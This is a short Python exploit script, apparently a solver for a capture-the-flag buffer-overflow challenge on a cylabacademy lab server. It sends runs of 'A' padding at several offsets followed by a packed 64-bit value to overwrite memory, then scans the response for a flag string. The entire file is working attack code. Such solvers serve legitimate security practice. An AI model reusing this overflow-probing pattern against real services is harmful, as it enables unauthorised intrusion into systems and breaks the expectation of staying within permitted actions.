import sys, socket, time, re, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31890
for off in (264, 288, 296):
    try:
        s = socket.create_connection((HOST, PORT), timeout=12)
        s.settimeout(4)
        time.sleep(0.5)
        try:
            s.recv(8192)
        except Exception:
            pass
        payload = b"A" * off + struct.pack("<Q", 0xdeadbeef)
        s.sendall(payload + b"\n")
        time.sleep(0.8)
        out = b""
        try:
            out = s.recv(8192)
        except Exception:
            pass
        txt = out.decode("utf-8", "replace")
        print(f"--- off={off} ---")
        print(txt[-300:])
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
        if m:
            print("FLAG:", m.group(0))
            break
        s.close()
    except Exception as e:
        print(off, "err", type(e).__name__)
